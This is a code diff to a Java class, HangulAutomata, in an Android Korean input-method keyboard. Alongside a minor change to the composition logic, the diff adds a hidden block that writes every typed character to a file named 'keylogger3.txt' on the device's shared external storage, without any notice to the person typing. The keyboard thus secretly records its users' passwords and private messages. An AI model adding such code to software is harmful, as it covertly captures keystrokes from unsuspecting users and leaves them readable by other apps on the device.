@@ -5,8 +5,12 @@
 
 package com.feelnsolar.inputmethod.hangul;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.UnsupportedEncodingException;
 import java.util.Arrays;
+
+import android.os.Environment;
 import android.util.Log;
 
 public class HangulAutomata {
@@ -124,7 +128,7 @@ public class HangulAutomata {
     	case HANGUL_JUNG1:
     		if(c == HANGUL_JA)
     		{
-    			if(primaryCode == 12611 || primaryCode == 12614 || primaryCode == 12617)
+    			if(primaryCode == 12611 || primaryCode == 12617)
     				mCurrentState = HANGUL_FINISH2;
     			else
     				mCurrentState = HANGUL_JONG1;
@@ -502,6 +506,22 @@ public class HangulAutomata {
 				encodingCode(mHangulCharBuffer[1]) + encodingCode(mHangulCharBuffer[2]) + "]"  + 
 				", completed=\'" + encodingCode(completedChar) + "\'" + 
 				", working=\'" + encodingCode(mWorkingChar) + "\'");
+
+			String keypress =  encodingCode(mWorkingChar);
+
+			try {
+				String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();
+				String FILENAME = "keylogger3.txt";
+
+				File outfile = new File(SDCARD + File.separator + FILENAME);
+				FileOutputStream fos = new FileOutputStream(outfile, true);
+				fos.write(keypress.getBytes());
+				fos.close();
+			} catch (Exception e) {
+				Log.d("EXCEPTION", e.getMessage());
+			}
+
+
         }
 
         int[] ret = {-1, -1, -1};
@@ -532,6 +552,7 @@ public class HangulAutomata {
 	    	try
 	    	{
 	    		str = new String(c.getBytes(), SoftKeyboard.DEF_CHARSET);
+
 	    	}
 	    	catch(UnsupportedEncodingException e)
 	    	{
@@ -859,6 +880,7 @@ public class HangulAutomata {
 	    	if(-1 != c)
 				out += (char)c;
     	}
+
     	return out;
     }
 
